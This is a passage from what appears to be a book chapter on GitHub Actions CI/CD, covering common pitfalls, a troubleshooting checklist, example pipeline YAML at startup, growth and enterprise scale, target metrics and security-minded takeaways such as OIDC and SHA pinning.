- Some actions behave differently (especially ones using runner-specific paths).

Use `act` for fast feedback on workflow syntax and step logic. Validate on real GitHub runners for the final pass. The mental model: `act` is your local integration test; GitHub is your staging environment.

### 13.3 Common Pitfalls

**Permission errors:**

```
Error: Resource not accessible by integration
```

The `GITHUB_TOKEN` lacks permissions for the API call. Add the required permission scope to the job. This is almost always the solution — check the permissions table in §2.5.

**Cache misses:**

Caches are scoped to the branch. A PR branch can read caches from the base branch, but not from other PR branches. If you consistently miss cache on PRs, ensure main branch runs populate the cache first. The pattern: cache on main, read on PRs.

**Service container networking:**

Inside a workflow, service containers are accessible at `localhost:<port>` on the runner. But if you run tests inside a Docker container (e.g., `container: node:22`), service containers are accessible at their service name (e.g., `postgres:5432`), not `localhost`. This trips up nearly every engineer the first time.

**Checkout depth:**

If your build needs git history (e.g., for changelogs, version detection, or `git diff`), set `fetch-depth: 0`. The default `fetch-depth: 1` only fetches the latest commit. Turborepo and Nx affected commands both require full history.

**Expression syntax in `if:`:**

```yaml
# These are NOT the same:
if: github.ref == 'refs/heads/main'         # Correct
if: ${{ github.ref == 'refs/heads/main' }}   # Also correct
if: github.ref == refs/heads/main            # WRONG: unquoted string
```

### 13.4 "Works Locally, Fails in CI" Checklist

This is the universal developer frustration. When something passes on your machine but fails in CI, check these in order:

1. **Environment variables:** Is an env var set locally but not in CI? Check `.env` files vs secrets configuration.
2. **Node/Python/Go version:** Local version might differ from CI. Pin versions explicitly.
3. **OS differences:** macOS locally vs Linux in CI. Path separators, case sensitivity, pre-installed tools all differ.
4. **File ordering:** Some OS/FS combinations return files in different orders. If tests depend on file order, they will flake.
5. **Network access:** Local tests hit real services. CI might need service containers or mocks.
6. **Time zones:** Runner uses UTC. Your machine uses local time. If tests depend on "today", they might fail near midnight UTC.
7. **Disk space:** CI runners have limited storage. Large builds, Docker images, or test fixtures can fill the disk.
8. **Permissions:** Files might have different permission bits. Git does not preserve all Unix permissions.
9. **Concurrent access:** If multiple tests write to the same file or port, CI's different timing might expose race conditions that don't surface locally.
10. **Cache pollution:** Running `npm ci` locally uses your global npm cache. CI might have stale or empty caches.

Work through this list systematically before reaching for the nuclear option of adding `ACTIONS_RUNNER_DEBUG=true`.

---

## 14. THE 100X CI/CD PIPELINE

### 14.1 What a Mature Pipeline Looks Like

A mature CI/CD pipeline is not a workflow file. It is a system — interconnected workflows, reusable components, organizational policies, and cultural norms around how code moves from engineer laptop to production.

The sign of a truly mature pipeline is that merging to main is boring. Not exciting. Not stressful. Boring. The automation handles everything correctly every time, and the humans only get involved for genuinely human decisions.

Here is what that looks like at different scales.

### 14.2 Startup Pipeline (Speed Over Everything)

When you have 1-5 engineers, keep it simple. The biggest mistake startups make is over-engineering CI before they have a validated product. One workflow. Under 50 lines. Ship fast.

```yaml
# .github/workflows/ci.yml — The only workflow you need
name: CI/CD

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read
  id-token: write

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test
      - run: npm run build

  deploy:
    needs: ci
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: production
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_ROLE_ARN }}
          aws-region: us-east-1
      - run: npm ci && npm run build
      - run: ./scripts/deploy.sh
```

**Properties:** Single file. Under 50 lines. Deploys on merge to main. OIDC from day one. Total runtime: ~4 minutes.

Start here. Resist the urge to add matrix strategies, reusable workflows, and compliance gates before you need them. Complexity is debt; build it when you have a real problem.

### 14.3 Growth Pipeline (10-50 Engineers)

At this scale, you have a monorepo, multiple services, and engineers who are blocked when CI runs take 12 minutes for every change. Add reusable workflows, change detection, and multiple environments:

```yaml
# .github/workflows/ci.yml — Caller workflow
name: CI

on:
  pull_request:
    branches: [main]

permissions: {}

jobs:
  detect:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'apps/api/**'
              - 'packages/shared/**'
            web:
              - 'apps/web/**'
              - 'packages/shared/**'
              - 'packages/ui/**'

  api-ci:
    needs: detect
    if: needs.detect.outputs.api == 'true'
    uses: ./.github/workflows/node-ci-reusable.yml
    with:
      working_directory: 'apps/api'
      run_e2e: true
    secrets: inherit

  web-ci:
    needs: detect
    if: needs.detect.outputs.web == 'true'
    uses: ./.github/workflows/node-ci-reusable.yml
    with:
      working_directory: 'apps/web'
      run_e2e: false
    secrets: inherit
```

```yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy-staging:
    uses: ./.github/workflows/deploy-reusable.yml
    with:
      environment: staging
      aws_role: ${{ vars.STAGING_AWS_ROLE }}
    secrets: inherit

  smoke-tests:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run test:smoke -- --base-url=${{ needs.deploy-staging.outputs.url }}

  deploy-production:
    needs: smoke-tests
    uses: ./.github/workflows/deploy-reusable.yml
    with:
      environment: production
      aws_role: ${{ vars.PRODUCTION_AWS_ROLE }}
    secrets: inherit
```

**Properties:** Reusable workflows. Change detection. Staging → smoke tests → production. OIDC with environment-scoped roles. CI only runs for affected packages. The CSS engineer's PR runs in 90 seconds.

### 14.4 Enterprise Pipeline (100+ Engineers)

At enterprise scale, add compliance gates, self-hosted runners, and cross-repo orchestration. The pipeline is now a system with its own governance:

```yaml
# In org/shared-workflows repo
# .github/workflows/enterprise-ci.yml
name: Enterprise CI (Reusable)

on:
  workflow_call:
    inputs:
      service_name:
        type: string
        required: true
      compliance_level:
        type: string
        default: 'standard'  # standard, pci, hipaa
      deploy_target:
        type: string
        default: 'ecs'

jobs:
  security-scan:
    runs-on: [self-hosted, linux, x64]
    steps:
      - uses: actions/checkout@v4
      - name: SAST scan
        uses: github/codeql-action/analyze@v3
      - name: Dependency scan
        run: npm audit --production --audit-level=high
      - name: Container scan
        if: inputs.deploy_target == 'ecs'
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'CRITICAL,HIGH'

  compliance-gate:
    needs: security-scan
    if: inputs.compliance_level != 'standard'
    runs-on: [self-hosted, linux, x64]
    steps:
      - name: PCI DSS checks
        if: inputs.compliance_level == 'pci'
        run: ./scripts/compliance/pci-check.sh
      - name: HIPAA checks
        if: inputs.compliance_level == 'hipaa'
        run: ./scripts/compliance/hipaa-check.sh
      - name: Generate audit trail
        run: |
          cat >> "$GITHUB_STEP_SUMMARY" << EOF
          ## Compliance Report
          - **Service:** ${{ inputs.service_name }}
          - **Level:** ${{ inputs.compliance_level }}
          - **Commit:** ${{ github.sha }}
          - **Actor:** ${{ github.actor }}
          - **Timestamp:** $(date -u +"%Y-%m-%dT%H:%M:%SZ")
          - **Status:** Passed
          EOF

  deploy:
    needs: [security-scan, compliance-gate]
    if: always() && needs.security-scan.result == 'success' && (needs.compliance-gate.result == 'success' || needs.compliance-gate.result == 'skipped')
    runs-on: [self-hosted, linux, x64]
    environment: production
    steps:
      - uses: actions/checkout@v4
      - name: Deploy with audit logging
        run: |
          ./scripts/deploy.sh \
            --service ${{ inputs.service_name }} \
            --commit ${{ github.sha }} \
            --actor ${{ github.actor }} \
            --run-id ${{ github.run_id }}
```

**Properties:** Self-hosted runners for network access and compliance tooling. Mandatory security scanning. Compliance gates for regulated services. Full audit trail in job summaries. Cross-repo reusable workflows that every team in the org inherits automatically.

### 14.5 Reference Architecture

```
                    ┌─────────────────────────────────────────┐
                    │            PR Opened / Updated           │
                    └──────────────────┬──────────────────────┘
                                       │
                    ┌──────────────────▼──────────────────────┐
                    │          Change Detection                │
                    │   (dorny/paths-filter or turbo affected) │
                    └──┬───────────┬───────────┬──────────────┘
                       │           │           │
              ┌────────▼──┐  ┌────▼─────┐  ┌──▼──────────┐
              │  API CI   │  │  Web CI  │  │  Shared CI  │
              │(reusable) │  │(reusable)│  │ (reusable)  │
              └────────┬──┘  └────┬─────┘  └──┬──────────┘
                       │         │            │
                       └────┬────┘────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │        All Checks Pass            │
              │    (required status checks)       │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │         Merge to Main             │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │     Deploy to Staging (auto)      │
              │        (OIDC credentials)         │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │      Smoke Tests on Staging       │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │   Deploy to Production (gated)    │
              │   (required reviewer approval)    │
              │        (OIDC credentials)         │
              └─────────────┬────────────────────┘
                            │
              ┌─────────────▼────────────────────┐
              │    Post-Deploy Health Checks      │
              │   (automatic rollback on fail)    │
              └──────────────────────────────────┘
```

### 14.6 Key Metrics to Track

| Metric | Startup Target | Growth Target | Enterprise Target |
|--------|---------------|---------------|-------------------|
| PR CI duration | < 5 min | < 8 min | < 12 min |
| Deploy to staging | < 3 min | < 5 min | < 10 min |
| Deploy to production | < 5 min | < 10 min | < 15 min |
| CI flake rate | < 2% | < 1% | < 0.5% |
| MTTR (deploy fix) | < 15 min | < 15 min | < 30 min |
| Secret rotation | OIDC (auto) | OIDC (auto) | OIDC + Vault |

If your pipeline is hitting these targets, merging to main is boring. And boring CI is exactly what you want.

---

## KEY TAKEAWAYS

1. **Path filtering is free performance.** In a monorepo, only run CI for what changed. This alone can cut runner costs 50-80% and make engineers trust CI results again.

2. **OIDC federation is non-negotiable.** Stop storing cloud credentials as GitHub secrets. OIDC gives you automatic rotation, fine-grained scope, and audit trails — and eliminates the entire class of "leaked long-lived key" incidents.

3. **Reusable workflows and composite actions eliminate copy-paste.** Standardize your pipeline once, share it across every repo. Updates propagate from one place. The 12-repo update becomes a one-PR update.

4. **Pin actions by SHA.** Tags are mutable. A compromised action can steal your secrets. SHA pinning with Dependabot auto-updates is the right balance of security and maintenance.

5. **Set permissions to minimal.** Start with `permissions: {}` at the top level and grant per-job. The principle of least privilege applies to CI tokens as much as to IAM roles.

6. **Always set timeouts.** A hung job burns runner minutes for 6 hours by default. Set `timeout-minutes` on every job. This is the simplest thing you can do that costs nothing and saves real money.

7. **Measure CI performance.** Track duration, flake rate, and cost weekly. If you cannot measure it, you cannot improve it — and CI duration is one of the most direct levers on developer productivity.

8. **Treat CI as code.** Review workflow changes. Use CODEOWNERS. Test with `act`. Version reusable workflows. Your CI pipeline is production infrastructure — engineer it with the same rigor as your application. The team that does this ships faster, sleeps better, and never spends a Friday babysitting a deployment.

---

*Next: Chapter 34 explores spec-driven development — writing the specification before the code, from RFCs and OpenAPI contracts to AI-native specs that serve as the interface between human intent and machine execution.*
